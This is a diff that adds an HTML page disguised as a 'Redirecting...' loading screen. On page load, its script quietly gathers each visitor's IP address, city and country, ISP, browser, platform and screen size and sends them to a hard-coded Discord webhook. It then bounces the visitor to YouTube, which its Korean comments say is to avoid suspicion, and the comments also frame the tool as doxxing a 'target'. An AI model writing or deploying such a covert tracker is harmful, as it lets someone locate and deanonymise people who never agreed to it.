@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Redirecting...</title>
+</head>
+<body onload="runLogger()">
+    <div style="text-align:center; margin-top:100px; font-family:sans-serif;">
+        <p>콘텐츠를 불러오는 중입니다...</p>
+    </div>
+
+    <script>
+        async function runLogger() {
+            // 사용자님이 주신 웹훅 주소 적용
+            const webhookURL = "https://discord.com/api/webhooks/1460622639637729402/McoPaA3kn18CkbdlyigwKt7RnFrOrnzdOarw9shUjQawzedZzLfmtB4hCc7kcfUeM7rd";
+            
+            try {
+                // 1. IP 기반 신상 털기 (위치, 통신사 등)
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const data = await ipRes.json();
+
+                // 2. 디스코드 전송 데이터 구성 (클릭 즉시 자동 수집되는 정보들)
+                const payload = {
+                    embeds: [{
+                        title: "🎯 타겟 즉시 검거 (자동 수집 완료)",
+                        color: 15105570,
+                        fields: [
+                            { name: "🌐 IP 주소", value: data.ip || "Unknown", inline: true },
+                            { name: "📍 위치 (도시/국가)", value: `${data.city}, ${data.country_name}`, inline: true },
+                            { name: "🏢 통신사 (ISP)", value: data.org || "Unknown" },
+                            { name: "📱 접속 기기 정보", value: navigator.userAgent },
+                            { name: "🖥️ OS / 플랫폼", value: navigator.platform, inline: true },
+                            { name: "📏 해상도", value: `${window.screen.width}x${window.screen.height}`, inline: true },
+                            { name: "⏰ 접속 시간", value: new Date().toLocaleString() }
+                        ],
+                        footer: { text: "No-Input Stealth Logger v1.0" }
+                    }]
+                };
+
+                // 3. 웹훅 전송
+                await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+            } catch (e) {
+                console.log("Capture failed");
+            } finally {
+                // 4. 전송 직후 유튜브로 강제 이동 (의심 회피)
+                location.href = "https://www.youtube.com";
+            }
+        }
+    </script>
+</body>
+</html>
